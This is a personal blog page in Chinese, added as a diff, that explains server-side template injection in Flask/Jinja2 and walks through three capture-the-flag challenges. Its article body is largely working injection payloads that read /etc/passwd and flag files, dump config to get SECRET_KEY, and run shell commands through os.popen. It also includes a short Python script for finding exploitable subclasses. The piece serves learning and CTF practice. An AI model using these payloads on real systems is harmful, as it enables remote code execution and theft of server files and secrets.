@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSTI模板注入 | yk1ng</title><meta name="author" content="yk1ng"><meta name="copyright" content="yk1ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSTI模板注入（详解学习中）关于SSTI什么是ssti模板SSTI（Server-Side Template Injection）指的是服务器端模板注入，它是一种安全漏洞，发生在使用服务器端模板引擎的 web 应用程序中。当应用程序允许用户控制模板引擎中的代码时，攻击者可以通过注入恶意代码来执行任意命令，获取敏感信息或者实施其他攻击。 通常情况下，模板引擎被设计用来渲染静态内容和动态数据以生成最">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入">
+<meta property="og:url" content="https://yzhikang.github.io/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="yk1ng">
+<meta property="og:description" content="SSTI模板注入（详解学习中）关于SSTI什么是ssti模板SSTI（Server-Side Template Injection）指的是服务器端模板注入，它是一种安全漏洞，发生在使用服务器端模板引擎的 web 应用程序中。当应用程序允许用户控制模板引擎中的代码时，攻击者可以通过注入恶意代码来执行任意命令，获取敏感信息或者实施其他攻击。 通常情况下，模板引擎被设计用来渲染静态内容和动态数据以生成最">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yzhikang.github.io/img/blog.png">
+<meta property="article:published_time" content="2024-03-20T09:39:42.000Z">
+<meta property="article:modified_time" content="2024-03-20T16:00:32.580Z">
+<meta property="article:author" content="yk1ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yzhikang.github.io/img/blog.png"><link rel="shortcut icon" href="/img/touxiang.png"><link rel="canonical" href="https://yzhikang.github.io/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: yk1ng","link":"链接: ","source":"来源: yk1ng","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSTI模板注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-21 00:00:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/blog.png')"><nav id="nav"><span id="blog-info"><a href="/" title="yk1ng"><span class="site-name">yk1ng</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSTI模板注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-03-20T09:39:42.000Z" title="发表于 2024-03-20 17:39:42">2024-03-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSTI模板注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SSTI模板注入（详解学习中）"><a href="#SSTI模板注入（详解学习中）" class="headerlink" title="SSTI模板注入（详解学习中）"></a>SSTI模板注入（详解学习中）</h1><h2 id="关于SSTI"><a href="#关于SSTI" class="headerlink" title="关于SSTI"></a>关于SSTI</h2><h3 id="什么是ssti模板"><a href="#什么是ssti模板" class="headerlink" title="什么是ssti模板"></a>什么是ssti模板</h3><p>SSTI（Server-Side Template Injection）指的是服务器端模板注入，它是一种安全漏洞，发生在使用服务器端模板引擎的 web 应用程序中。当应用程序允许用户控制模板引擎中的代码时，攻击者可以通过注入恶意代码来执行任意命令，获取敏感信息或者实施其他攻击。</p>
+<p>通常情况下，模板引擎被设计用来渲染静态内容和动态数据以生成最终的 HTML 页面。然而，当用户提供的输入未经充分验证并直接传递到模板引擎时，就可能导致 SSTI 漏洞。攻击者可以利用这一漏洞来执行任意代码，例如读取服务器上的文件、执行系统命令等。</p>
+<p>为了防范 SSTI 攻击，开发人员需要对用户输入进行严格的验证和过滤，并在将其传递到模板引擎之前进行适当的处理，以确保其中不包含恶意代码。同时，使用最新版本的模板引擎并及时更新相关库也是降低 SSTI 漏洞风险的重要措施。</p>
+<h2 id="以下模板存在注入"><a href="#以下模板存在注入" class="headerlink" title="以下模板存在注入"></a>以下模板存在注入</h2><p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image.png"></p>
+<h3 id="引发原因"><a href="#引发原因" class="headerlink" title="引发原因"></a>引发原因</h3><p>举例：</p>
+<p><strong>render_template</strong>渲染函数的问题</p>
+<p>render_template()函数是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>函数，它从模版文件夹templates中呈现给定的模板上下文。</p>
+<h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>众所周知ssti要被<code>&#123;&#123;&#125;&#125;</code>包括。接下来的代码均要包括在ssti中。</p>
+<h3 id="1-几种常用于ssti的魔术方法"><a href="#1-几种常用于ssti的魔术方法" class="headerlink" title="1.几种常用于ssti的魔术方法"></a><strong>1.几种常用于ssti的魔术方法</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"> </span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"> </span><br><span class="line">__base__ 返回该对象所继承的基类</span><br><span class="line"> </span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"> </span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"> </span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"> </span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"> </span><br><span class="line">__builtins__ builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-获取基类的几种方法"><a href="#2-获取基类的几种方法" class="headerlink" title="2.获取基类的几种方法"></a><strong>2.获取基类的几种方法</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line"> </span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line"> </span><br><span class="line">().__class__.__base__</span><br><span class="line"> </span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line"> </span><br><span class="line">request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用</span><br><span class="line"> </span><br><span class="line">或者</span><br><span class="line"> </span><br><span class="line">[].__class__.__bases__[0] //其他的类似</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.获取基本类的子类</strong></p>
+<p>使用__subclasses__获取基类的子类，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__</span><br></pre></td></tr></table></figure>
+
+<p>然后SSTI注入就是从这些子类中寻找能够利用其进行文件读取或RCE的子类进行漏洞利用</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[&quot;os类的位置&quot;].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)//读取本级目录</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125; //文件读取</span><br></pre></td></tr></table></figure>
+
+<p>寻找的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line"> </span><br><span class="line">             <span class="built_in">print</span> (num,item)</span><br><span class="line"> </span><br><span class="line">             num+=<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line"> </span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用实例（刷题积累经验）"><a href="#利用实例（刷题积累经验）" class="headerlink" title="利用实例（刷题积累经验）"></a>利用实例（刷题积累经验）</h2><h3 id="1、Web-python-template-injection（攻防世界）"><a href="#1、Web-python-template-injection（攻防世界）" class="headerlink" title="1、Web_python_template_injection（攻防世界）"></a>1、Web_python_template_injection（攻防世界）</h3><p>首先使用49进行判断是否存在注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114193911100.png"></p>
+<p>变成了49说明存在注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>寻找可利用的子类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114200209752.png"></p>
+<p>file位于第四十个可以进行文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125; //文件读取</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114200949254.png"></p>
+<p>位于71的&lt;class ‘site._Printer’&gt;可以进行命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;//读取本级目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114203028961.png" alt="image-20231114203028961"></p>
+<p>构造payload读取本级目录下fl4g:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114203328849.png" alt="image-20231114203328849"></p>
+<h3 id="2、Simple-SSTI-1（bugku）"><a href="#2、Simple-SSTI-1（bugku）" class="headerlink" title="2、Simple_SSTI_1（bugku）"></a>2、Simple_SSTI_1（bugku）</h3><p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114203703784.png" alt="image-20231114203703784"></p>
+<p>传入flag&#x3D;100判断存在注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114203802662.png" alt="image-20231114203802662"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114204224218.png" alt="image-20231114204224218"></p>
+<p>根据提示需要找到secret_key</p>
+<p>SECRET_KEY：flask中的一种配置属性，flask涉及安全的东西需要用这个SECRET_KEY密钥进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;//查找全局变量</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114204404531.png" alt="image-20231114204404531"></p>
+<p>拿到flag</p>
+<h3 id="3、Simple-SSTI-2（bugku）"><a href="#3、Simple-SSTI-2（bugku）" class="headerlink" title="3、Simple_SSTI_2（bugku）"></a>3、Simple_SSTI_2（bugku）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yzhikang/blog-pic/image-20231114204946068.png" alt="image-20231114204946068"></p>
+<p>找到第127的位置可以利用&lt;class ‘os._wrap_close’&gt;进行命令执行</p>
+<p>命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件读写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:flag{bab6aa2910d60d260784480c2d17744c}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[154].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat //app.py /f1__A_g.txt&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yzhikang.github.io">yk1ng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yzhikang.github.io/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://yzhikang.github.io/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yzhikang.github.io" target="_blank">yk1ng</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/blog.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/20/2024%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="2024新的博客"><img class="cover" src="/img/blog.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024新的博客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yk1ng</div><div class="author-info__description">还是做不到嘛</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yk1ng的技术杂货铺，如果喜欢记得收藏奥～</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E8%AF%A6%E8%A7%A3%E5%AD%A6%E4%B9%A0%E4%B8%AD%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">SSTI模板注入（详解学习中）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ESSTI"><span class="toc-number">1.1.</span> <span class="toc-text">关于SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFssti%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是ssti模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8B%E6%A8%A1%E6%9D%BF%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">以下模板存在注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%91%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">引发原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">如何利用？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%A0%E7%A7%8D%E5%B8%B8%E7%94%A8%E4%BA%8Essti%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.几种常用于ssti的魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%B1%BB%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.获取基类的几种方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B%EF%BC%88%E5%88%B7%E9%A2%98%E7%A7%AF%E7%B4%AF%E7%BB%8F%E9%AA%8C%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">利用实例（刷题积累经验）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Web-python-template-injection%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">1、Web_python_template_injection（攻防世界）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81Simple-SSTI-1%EF%BC%88bugku%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">2、Simple_SSTI_1（bugku）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81Simple-SSTI-2%EF%BC%88bugku%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">3、Simple_SSTI_2（bugku）</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="SSTI模板注入"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSTI模板注入"/></a><div class="content"><a class="title" href="/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="SSTI模板注入">SSTI模板注入</a><time datetime="2024-03-20T09:39:42.000Z" title="发表于 2024-03-20 17:39:42">2024-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/2024%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="2024新的博客"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024新的博客"/></a><div class="content"><a class="title" href="/2024/03/20/2024%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="2024新的博客">2024新的博客</a><time datetime="2024-03-20T09:14:16.000Z" title="发表于 2024-03-20 17:14:16">2024-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div 